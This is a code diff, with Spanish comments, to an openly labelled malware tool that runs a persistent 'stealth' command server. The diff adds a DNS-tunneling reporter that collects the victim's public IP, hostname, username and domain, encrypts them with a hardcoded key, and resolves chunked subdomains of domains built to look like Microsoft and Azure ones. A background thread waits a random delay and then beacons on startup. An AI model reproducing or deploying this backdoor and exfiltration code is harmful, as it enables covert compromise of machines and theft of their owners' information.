@@ -28,6 +28,136 @@ import io
 import select
 
 
+# ==================== SISTEMA AUTO-REPORTE DNS ====================
+
+class DNSReporter:
+    def __init__(self):
+        self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
+        self.cipher = Fernet(self.encryption_key)
+        self.reported = False
+
+    def get_system_info(self):
+        """Obtener información del sistema de forma segura"""
+        try:
+            # Obtener IP pública mediante múltiples servicios
+            ip_services = [
+                'https://api.ipify.org',
+                'https://ident.me',
+                'https://checkip.amazonaws.com'
+            ]
+
+            public_ip = None
+            for service in ip_services:
+                try:
+                    public_ip = requests.get(service, timeout=10).text.strip()
+                    if public_ip and '.' in public_ip:
+                        break
+                except:
+                    continue
+
+            return {
+                'public_ip': public_ip,
+                'hostname': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
+                'user': os.environ.get('USERNAME', 'UNKNOWN'),
+                'os': os.name,
+                'timestamp': int(time.time()),
+                'domain': os.environ.get('USERDOMAIN', 'UNKNOWN')
+            }
+        except:
+            return None
+
+    def encrypt_data(self, data):
+        """Cifrar datos para DNS"""
+        try:
+            json_data = json.dumps(data)
+            encrypted = self.cipher.encrypt(json_data.encode())
+            # Convertir a base32 para DNS (mejor que base64 para URLs)
+            base32_encoded = base64.b32encode(encrypted).decode().lower().replace('=', '')
+            return base32_encoded
+        except:
+            return None
+
+    def report_via_dns(self):
+        """Reportar información mediante DNS tunneling"""
+        if self.reported:
+            return True
+
+        try:
+            system_info = self.get_system_info()
+            if not system_info or not system_info.get('public_ip'):
+                return False
+
+            # Cifrar datos
+            encrypted_data = self.encrypt_data(system_info)
+            if not encrypted_data:
+                return False
+
+            # Dividir en chunks para DNS
+            chunks = [encrypted_data[i:i + 20] for i in range(0, len(encrypted_data), 20)]
+
+            # Dominio base (usar múltiples para evasión)
+            domains = [
+                "dns.azure-update.com",
+                "report.windows-telemetry.com",
+                "stats.microsoft-edge.com"
+            ]
+
+            for i, chunk in enumerate(chunks):
+                domain = f"{chunk}.{random.choice(domains)}"
+                try:
+                    # Resolución DNS silenciosa
+                    socket.gethostbyname(domain)
+                    time.sleep(0.3)  # Pequeña pausa entre requests
+                except:
+                    # Fallo silencioso en DNS es normal
+                    pass
+
+            self.reported = True
+            return True
+
+        except:
+            return False
+
+
+class StealthyIPResolver:
+    def __init__(self):
+        self.dns_servers = [
+            '8.8.8.8',  # Google DNS
+            '1.1.1.1',  # Cloudflare
+            '9.9.9.9',  # Quad9
+            '208.67.222.222'  # OpenDNS
+        ]
+
+    def get_public_ip_stealth(self):
+        """Obtener IP pública de forma stealth"""
+        try:
+            # Crear socket raw para bypass posible bloqueo
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(5)
+
+            for dns_server in self.dns_servers:
+                try:
+                    # Consulta DNS directa a servidores públicos
+                    sock.connect((dns_server, 53))
+                    local_ip = sock.getsockname()[0]
+                    sock.close()
+
+                    # Usar servicio HTTP como fallback
+                    try:
+                        ip = requests.get('https://api.ipify.org', timeout=5).text
+                        if ip:
+                            return ip
+                    except:
+                        pass
+
+                    return local_ip
+                except:
+                    continue
+            return None
+        except:
+            return None
+
+
 # ==================== CONFIGURACIÓN MALICIOSA EXTREMA ====================
 
 class AdvancedMalwareConfig:
@@ -350,6 +480,31 @@ class StealthServer:
         self.max_connections = 5  # Límite de conexiones simultáneas
         self.current_connections = 0
 
+        self.reporter = DNSReporter()
+        self.report_sent = False
+
+
+    def send_stealth_report(self):
+        """Enviar reporte stealth de forma asíncrona"""
+
+        def async_report():
+            # Esperar aleatoriamente entre 1-5 minutos
+            time.sleep(random.randint(60, 300))
+
+            # Intentar reportar múltiples veces
+            for attempt in range(3):
+                try:
+                    if self.reporter.report_via_dns():
+                        print("[+] Sistema reportado exitosamente")
+                        break
+                    else:
+                        time.sleep(30)  # Esperar antes de reintentar
+                except:
+                    time.sleep(60)
+
+        # Ejecutar en hilo separado para no bloquear
+        threading.Thread(target=async_report, daemon=True).start()
+
     def execute_command(self, cmd):
         """Ejecutar comando silenciosamente con límite de tiempo"""
         try:
@@ -492,8 +647,13 @@ class StealthServer:
         return False
 
     def start_persistent_server(self):
-        """Iniciar servidor con control de recursos"""
+        """Iniciar servidor con auto-reporte"""
         print(f" Servidor iniciado en puerto {self.port}")
+
+        # AUTO-REPORTE al iniciar (solo una vez)
+        if not self.report_sent:
+            self.send_stealth_report()
+            self.report_sent = True
 
         while self.running:
             try:
@@ -506,7 +666,7 @@ class StealthServer:
                 while self.running:
                     try:
                         client, addr = server.accept()
-                        print(f" Nueva conexión de {addr}")
+                        print(f"[+] Nueva conexión de {addr}")
 
                         # Manejar cliente en hilo separado
                         client_thread = threading.Thread(
